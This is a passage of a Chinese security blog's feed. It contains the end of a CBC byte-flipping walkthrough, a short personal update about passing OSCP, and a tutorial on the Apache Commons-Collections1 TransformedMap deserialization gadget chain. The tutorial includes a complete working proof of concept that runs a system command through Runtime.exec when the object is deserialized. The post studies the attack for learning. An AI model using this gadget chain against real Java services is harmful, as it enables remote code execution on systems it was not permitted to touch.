cipherEncode.doFinal(plainText.getBytes());</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Change the &quot;1&quot; pos of second plain block byte to &quot;0&quot;. In the whole plainText the pos is &quot;17&quot;</span></span><br><span class="line">    <span class="comment">//修改</span></span><br><span class="line">    <span class="comment">//&quot;bytesEncode[1] ^ plainTextBytes[17]&quot; returns &#x27;0&#x27;. &quot;&#x27;0&#x27; ^ &#x27;x&#x27;&quot; returns &#x27;x&#x27; so that we can control the decrypt result.</span></span><br><span class="line">    bytesEncode[<span class="number">1</span>] = (<span class="keyword">byte</span>)(bytesEncode[<span class="number">1</span>] ^ plainTextBytes[<span class="number">17</span>] ^ <span class="string">&#x27;x&#x27;</span>);  <span class="comment">//[!]</span></span><br><span class="line"></span><br><span class="line">    System.out.print(<span class="string">&quot;EnCrypt bytes: &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">byte</span> b : bytesEncode) &#123;</span><br><span class="line">        System.out.print(b + <span class="string">&quot; &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//decrypt</span></span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>OUTPUT:</p><p>PlainText bytes: 72 101 108 108 111 32 87 111 114 108 100 33 32 72 111 119 32 <span style="color:red"><strong>65</strong></span> 114 101 32 89 111 117 63 65 65 65 65 65 65 65<br>EnCrypt bytes: 90 105 -75 -65 -48 52 123 46 116 66 -13 -54 103 -120 5 -118 29 <span style="color:red"><strong>69</strong></span> 117 22 -89 50 112 -109 9 18 -81 -116 -7 -54 -85 52<br>ReDeCrypt bytes: -87 -95 -80 -82 25 -34 17 -119 -112 -56 69 103 21 -28 117 -65 32 <span style="color:red"><strong>120</strong></span> 114 101 32 89 111 117 63 65 65 65 65 65 65 65 </p><p>可以看到，第<code>17</code>字节在解密时已经被成功控制为字符<code>&#39;x&#39;</code>。</p><h1 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h1><ul><li>鉴权绕过 - CTF用的多</li><li>和Padding Oracle攻击配合，修改或增加密文</li><li>……</li></ul><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://resources.infosecinstitute.com/topic/cbc-byte-flipping-attack-101-approach/">CBC byte flipping attack—101 approach</a></p><p><a href="https://wooyun.js.org/drops/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB-101Approach.html">https://wooyun.js.org/drops/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB-101Approach.html</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;又有半年没更博客233，主要是懒，笔记和文还是有写的，只不过我开了一个私密的语雀，文都放到语雀上了。现在从语雀那扒拉几篇文，丢到博客上吧。&lt;/p&gt;</summary>
    
    
    
    <category term="加密" scheme="http://example.com/categories/%E5%8A%A0%E5%AF%86/"/>
    
    
    <category term="加密" scheme="http://example.com/tags/%E5%8A%A0%E5%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>博客跑路半年，简单说下这半年干了嘛</title>
    <link href="http://example.com/2021/12/06/2021-12-06-talk/"/>
    <id>http://example.com/2021/12/06/2021-12-06-talk/</id>
    <published>2021-12-06T13:43:06.000Z</published>
    <updated>2021-12-06T15:22:36.539Z</updated>
    
    <content type="html"><![CDATA[<p>大概6月份吧。把域名的实名注销掉了。原因是之前备案时提供的ip早就释放掉了。担心别人用着那个ip，绑的实名却是我这里。于是乎，就注销了实名。然后又把服务器重装了下。嗯。然后就一直懒得弄了。</p><p>然后直到最近，才把博客再搭起来。因为懒得配服务器，博客直接放<code>github.io</code>了。再把原先域名的CNAME一指，完事。多简单。</p><p><strong>简单梳理下这半年干了啥</strong></p><p>6-8月，放暑假。在家玩玩魔兽，看看番，学了学Java、车、烹饪。最大收获是大概搞懂了RMI、过了科二、能搓一两个还能看的面包和蛋糕。。嗯。。可以说又是荒废了一个暑假</p><p>9月，因为之前OSCP考试挂了。所以打了一个月vulnhub靶机。约考10月5号，准备考试。</p><p>10月至今，幸好，OSCP过了。不然又得去水文赚补考费了。过了之后。照常在学校学学Java，这样。简单一想。我好像也没学啥。啧，，懒得梳理了。学习时写的文，，有空再传到博客来吧。我好懒 = =</p><p><strong>Todo</strong></p><p>今天无意翻了翻三梦师傅的博客。看到师傅执行过ARTS，即每周至少做一个算法题(Algorithm)；每周阅读点评一篇英语技术文章(Review)；每周学习至少一个技术技巧(Tip)；每周分享一篇有观点思考的技术文章(Share)。</p><p>我也想试试哈哈哈。降低下标准。我来试下”WRTS”。即：</p><p>W: 每周至少复现一个漏洞</p><p>R: 每周至少阅读一篇英语技术文章，分析并写出理解</p><p>T: 每周至少学习一个技术技巧</p><p>S: 每周分享一篇技术文章</p><p>嗯，，，感觉，，还行，不算太难吧哈哈哈哈。</p><p>就这样趴</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;大概6月份吧。把域名的实名注销掉了。原因是之前备案时提供的ip早就释放掉了。担心别人用着那个ip，绑的实名却是我这里。于是乎，就注销了实名。然后又把服务器重装了下。嗯。然后就一直懒得弄了。&lt;/p&gt;
&lt;p&gt;然后直到最近，才把博客再搭起来。因为懒得配服务器，博客直接放&lt;code</summary>
      
    
    
    
    <category term="life" scheme="http://example.com/categories/life/"/>
    
    
    <category term="life" scheme="http://example.com/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>ysoserial学习之番外 - CommonsCollections1 transformedmap链</title>
    <link href="http://example.com/2021/05/19/2021-05-19-ysoserial-extra-cc1-transformedmap/"/>
    <id>http://example.com/2021/05/19/2021-05-19-ysoserial-extra-cc1-transformedmap/</id>
    <published>2021-05-19T13:43:06.000Z</published>
    <updated>2021-09-04T11:27:06.525Z</updated>
    
    <content type="html"><![CDATA[<p>看完URLDNS之后再看CC链，，这尼玛简直就是一个天一个地。。前前后后大概看了三四天才能勉强说是理解了。然后又花了两天多来写这篇文章。。我感觉我尽力了，，不知道是不是因为我的思维方式还停留在php上，感觉java的文章真是有点难写。。。也许是我太想把每个流程调用都贴出来吧。。后面我会学习下大佬们都是怎么写java文的。。这篇文章就先将就着这样看吧，我尽力了555。。。</p><span id="more"></span><br><p>CommonsCollections。用于提供更好用的数据结构，方便开发快速进行代码开发。</p><p>由于这个链子不在 ysoserial 中，但这个系列的主题为 ysoserial，于是就把这个链子当作番外来命标题了。</p><p><strong>环境</strong></p><p>jdk &lt; 8u71</p><p>maven</p><p><strong>Poc:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cc</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">transferMapTest</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;Runtime.class,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;xcalc&quot;</span>&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        </span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;x&quot;</span>);</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object o = declaredConstructor.newInstance(Retention.class, outerMap);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//序列化payload</span></span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(o);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化，触发漏洞点</span></span><br><span class="line">        ByteArrayInputStream byteArrayInputStream = <span class="keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray());</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        transferMapTest();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从POC中学漏洞，我们可以先去查<a href="https://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/index.html">手册</a>，看看对应POC中的类、函数大概干什么的，然后调试跟一跟，看看变量和参数是何时被赋值，进行了什么判断，执行了什么操作。这样在脑海中编织一个大概的轮廓，也许能够有助于我们理解一个漏洞。</p><p>由于这是一个反序列化洞，反序列化类型的漏洞的POC都包含两个大块：</p><ol><li>gadgets - 利用链</li><li>readObject() - 需要能够跳到gadgets</li></ol><br><h1 id="gadgets"><a href="#gadgets" class="headerlink" title="gadgets"></a>gadgets</h1><p>从Poc中抽出 gadgets 的相关代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">        <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">        <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">        <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">        <span class="keyword">new</span> Object[]&#123;Runtime.class,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">        <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;xcalc&quot;</span>&#125;</span><br><span class="line">    )</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;x&quot;</span>);</span><br><span class="line">Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br></pre></td></tr></table></figure><p>这里用到的CC库的类有：Transformer、ConstantTransformer、InvokerTransformer、ChainedTransformer、TransformedMap。挨个分析，看Java就得坐的住。</p><br><h2 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h2><p><strong>手册中定义如下：</strong></p><p><em><span style="color:#c93434">public interface Transformer</span></em></p><p><em>用于将一个对象转换换成另一个对象。通常用于对象转换或从对象中解析数据</em></p><br><p>查看源码，只有一个方法 <code>Object transform()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.commons.collections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="comment">//用于对输入的Object进行处理，输出新的Object</span></span><br><span class="line">    <span class="function">Object <span class="title">transform</span><span class="params">(Object var1)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h2 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2><p><strong>手册中定义如下：</strong></p><p><em><span style="color:#c93434">public class ConstantTransformer</span></em></p><p><em><span style="color:#c93434">extends Object</span></em></p><p><em><span style="color:#c93434">implements Transformer, Serializable</span></em></p><p><em>Transformer的实现类，任何时候只返回一个相同的“常量”</em></p><br><p>查看源码，列出和本漏洞相关的方法和属性（初初看的时候可以都大概瞄一瞄，这里为了篇幅和演示的原因就只列出和本漏洞相关的方法和属性了）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.commons.collections.functors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object iConstant;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//由于其实现了前文刚提到的 Transformer接口。</span></span><br><span class="line">    <span class="comment">//可以留意一下其重写的transform()方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2><p><strong>手册中定义如下：</strong></p><p><em><span style="color:#c93434">public class InvokerTransformer</span></em></p><p><em><span style="color:#c93434">extends Object</span></em></p><p><em><span style="color:#c93434">implements Transformer, Serializable</span></em></p><p><em>Transformer的实现类，通过反射创建一个新对象</em></p><br><p>查看源码，列出和本漏洞相关的方法和属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.commons.collections.functors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String iMethodName;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//实现Transformer接口重写的transform()方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            .....</span><br><span class="line">            <span class="comment">//如文档中所说，在这里进行了反射操作</span></span><br><span class="line">            <span class="comment">//在反序列化中，类的成员都是我们可控的。所以这里的参数都是可控的</span></span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">            .....</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><p><strong>手册中定义如下：</strong></p><p><span style="color:#c93434"><em>public class ChainedTransformer</em></span></p><p><span style="color:#c93434"><em>extends Object</em></span></p><p><span style="color:#c93434"><em>implements Transformer, Serializable</em></span></p><p><em>Transformer的实现类。将指定的 Transformer 像链子一样串起来。</em></p><p><em>输入的Object会按顺序进入指定的Transformer，得到输出后将结果再传入到第二个Transformer中，以此类推。</em></p><p><em>（有点像 Linux的管道操作，前一个输出作为后一个的输入）</em></p><br><p>查看源码，列出和本漏洞相关的方法和属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.commons.collections.functors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Transformer[] iTransformers;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//实现Transformer接口重写的transform()方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//如文档所说，遍历 this.iTransformers，依次调用对应transform()</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">            <span class="comment">//每次调用后都保存返回值，并作为下一次transform()的输入</span></span><br><span class="line">            object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h2 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h2><p><strong>手册中定义如下：</strong></p><p><span style="color:#c93434"><em>public class TransformedMap</em></span></p><p><em><span style="color:#c93434">extends AbstractMapDecorator</span></em></p><p><span style="color:#c93434"><em>implements Serializable</em></span></p><p><em>修饰Map，通过Transformer转换成对应类型。</em></p><p><em>TransformedMap的父类AbstractMapDecorator实现了Map接口。</em></p><p><em>TransformedMap重写了Map put()方法，TransformedMap父类AbstractInputCheckedMapDecorator重写了Map.MapEntry setValue()方法</em></p><br><p>查看源码，列出和本漏洞相关的方法和属性（不完全）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.commons.collections.map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractInputCheckedMapDecorator</span> <span class="keyword">extends</span> <span class="title">AbstractMapDecorator</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MapEntry</span> <span class="keyword">extends</span> <span class="title">AbstractMapEntryDecorator</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">MapEntry</span><span class="params">(Entry entry, AbstractInputCheckedMapDecorator parent)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(entry);</span><br><span class="line">            <span class="keyword">this</span>.parent = parent;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">setValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">            value = <span class="keyword">this</span>.parent.checkSetValue(value);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.entry.setValue(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">=============================================</span><br><span class="line"><span class="keyword">package</span> org.apache.commons.collections.map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformedMap</span> <span class="keyword">extends</span> <span class="title">AbstractInputCheckedMapDecorator</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer keyTransformer;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer valueTransformer;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//工厂方法，返回TransformedMap类实例</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(map);</span><br><span class="line">        <span class="keyword">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="keyword">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Object <span class="title">checkSetValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.valueTransformer.transform(value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此gadgets大致分析完毕，读者可以动手调试一下，加深理解。</p><br><h3 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h3><ol><li>InvokerTransformer类的 <code>transform()</code> 方法中存在可控的反射操作，这个操作就是这个链子的漏洞点。</li><li>Poc中gadgets的最后调用了 <code>TransformedMap.decorate()</code>，该方法返回TransformedMap类实例。 TransformedMap类中 调用 指定类<code>transform()</code>  的操作只有 <code>checkSetValue()</code> , <code>transformKey()</code> 和 <code>transformValue()</code> 